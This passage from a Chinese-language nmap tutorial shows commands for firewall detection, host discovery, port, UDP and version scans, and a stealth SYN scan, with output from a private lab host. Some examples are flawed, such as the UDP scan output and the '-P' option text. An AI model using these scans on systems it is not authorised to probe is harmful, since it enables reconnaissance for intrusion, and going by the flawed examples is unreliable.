class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.221 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:16 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 11.064 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="11-扫描主机侦测防火墙-sA"><a href="#11-扫描主机侦测防火墙-sA" class="headerlink" title="11.扫描主机侦测防火墙-sA"></a>11.扫描主机侦测防火墙-sA</h3><p>下面的命令将扫描远程主机以探测该主机是否使用了包过滤器或防火墙。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sA <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">27</span> EST</span><br><span class="line">All <span class="number">1680</span> scanned ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>) are UNfiltered</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.382</span> seconds</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="12-扫描主机检测是否有防火墙保护-PN"><a href="#12-扫描主机检测是否有防火墙保护-PN" class="headerlink" title="12.扫描主机检测是否有防火墙保护-PN"></a>12.扫描主机检测是否有防火墙保护-PN</h3><p>扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PN <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">30</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.399</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="13-找出网络中的在线主机-sP"><a href="#13-找出网络中的在线主机-sP" class="headerlink" title="13.找出网络中的在线主机-sP"></a>13.找出网络中的在线主机-sP</h3><p>使用“<strong>-sP</strong>”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sP <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">01</span> EST</span><br><span class="line">Host server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.109</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="14-执行快速扫描-F"><a href="#14-执行快速扫描-F" class="headerlink" title="14.执行快速扫描-F"></a>14.执行快速扫描-F</h3><p>你可以使用“<strong>-F</strong>”选项执行一次快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -F <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">47</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1234</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.322</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="15-查看Nmap的版本"><a href="#15-查看Nmap的版本" class="headerlink" title="15.查看Nmap的版本"></a>15.查看Nmap的版本</h3><p>你可以使用“<strong>-V</strong>”选项来检测你机子上Nmap的版本。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]<span class="comment"># nmap -V</span></span><br><span class="line"> </span><br><span class="line">Nmap version <span class="number">4.11</span> ( http:<span class="regexp">//</span>www.insecure.org<span class="regexp">/nmap/</span> )</span><br><span class="line">You have new mail <span class="keyword">in</span> <span class="regexp">/var/</span>spool<span class="regexp">/mail/</span>root</span><br></pre></td></tr></table></figure>

<h3 id="16-顺序扫描端口-r"><a href="#16-顺序扫描端口-r" class="headerlink" title="16.顺序扫描端口-r"></a>16.顺序扫描端口-r</h3><p>使用“-r”选项表示不会随机的选择端口扫描。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -r <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">52</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.363</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="17-打印主机接口和路由-iflist"><a href="#17-打印主机接口和路由-iflist" class="headerlink" title="17.打印主机接口和路由-iflist"></a>17.打印主机接口和路由-iflist</h3><p>你可以使用nmap的“<strong>–iflist</strong>”选项检测主机接口和路由信息。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap --iflist</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:07 EST</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">****INTERFACES**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line">DEV  (SHORT) IP/MASK          TYPE     UP MAC</span><br><span class="line">lo   (lo)    127.0.0.1/8      loopback up</span><br><span class="line">eth0 (eth0)  192.168.0.100/24 ethernet up 08:00:27:11:C7:89</span><br><span class="line"> </span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">*ROUTES*</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span></span><br><span class="line">DST/MASK      DEV  GATEWAY</span><br><span class="line">192.168.0.0/0 eth0</span><br><span class="line">169.254.0.0/0 eth0</span><br></pre></td></tr></table></figure>

<p>从上面的输出你可以看到，nmap列举出了你系统上的接口以及它们各自的路由信息。</p>
<h3 id="18-扫描特定的端口-p"><a href="#18-扫描特定的端口-p" class="headerlink" title="18.扫描特定的端口-p"></a>18.扫描特定的端口-p</h3><p>使用Nmap扫描远程机器的端口有各种选项，你可以使用“-<strong>p</strong>”选项指定你想要扫描的端口，默认情况下nmap只扫描<strong>TCP</strong>端口。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) sca</span><br></pre></td></tr></table></figure>

<h3 id="19-扫描TCP端口-p-T"><a href="#19-扫描TCP端口-p-T" class="headerlink" title="19.扫描TCP端口-p T:"></a>19.扫描TCP端口-p T:</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> T:<span class="number">8888</span>,<span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="20-扫描UDP端口-sU"><a href="#20-扫描UDP端口-sU" class="headerlink" title="20.扫描UDP端口-sU"></a>20.扫描UDP端口-sU</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sU <span class="number">53</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">53</span>/udp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/udp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="21-扫描多个端口"><a href="#21-扫描多个端口" class="headerlink" title="21.扫描多个端口"></a>21.扫描多个端口</h3><p>你还可以使用选项“-<strong>P</strong>”来扫描多个端口。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">56</span> EST</span><br><span class="line">Interesting ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>):</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line"><span class="number">80</span>/tcp  open   http</span><br><span class="line"><span class="number">443</span>/tcp closed https</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.190</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="22-扫描指定范围内的端口"><a href="#22-扫描指定范围内的端口" class="headerlink" title="22.扫描指定范围内的端口"></a>22.扫描指定范围内的端口</h3><p>您可以使用表达式来扫描某个范围内的端口。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]#  nmap -p <span class="number">80</span><span class="number">-160</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br></pre></td></tr></table></figure>

<h3 id="23-查找主机服务版本号-sV"><a href="#23-查找主机服务版本号-sV" class="headerlink" title="23.查找主机服务版本号-sV"></a>23.查找主机服务版本号-sV</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sV <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">48</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 12.624 seconds</span><br></pre></td></tr></table></figure>

<h3 id="24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机"><a href="#24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机" class="headerlink" title="24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机"></a>24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机</h3><p>有时候包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用<strong>TCP ACK</strong>和<strong>TCP Syn</strong>（tcp探测扫描）方法来扫描远程主机。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">51</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.360</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="25-使用TCP-ACK扫描远程主机上特定的端口-PA-p"><a href="#25-使用TCP-ACK扫描远程主机上特定的端口-PA-p" class="headerlink" title="25.使用TCP ACK扫描远程主机上特定的端口-PA -p"></a>25.使用TCP ACK扫描远程主机上特定的端口-PA -p</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PA -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">02</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.166</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="26-使用TCP-Syn扫描远程主机上特定的端口"><a href="#26-使用TCP-Syn扫描远程主机上特定的端口" class="headerlink" title="26. 使用TCP Syn扫描远程主机上特定的端口"></a>26. 使用TCP Syn扫描远程主机上特定的端口</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">08</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.165</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="27-执行一次隐蔽的扫描-sS"><a href="#27-执行一次隐蔽的扫描-sS" class="headerlink" title="27.执行一次隐蔽的扫描-sS"></a>27.执行一次隐蔽的扫描-sS</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">10</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer 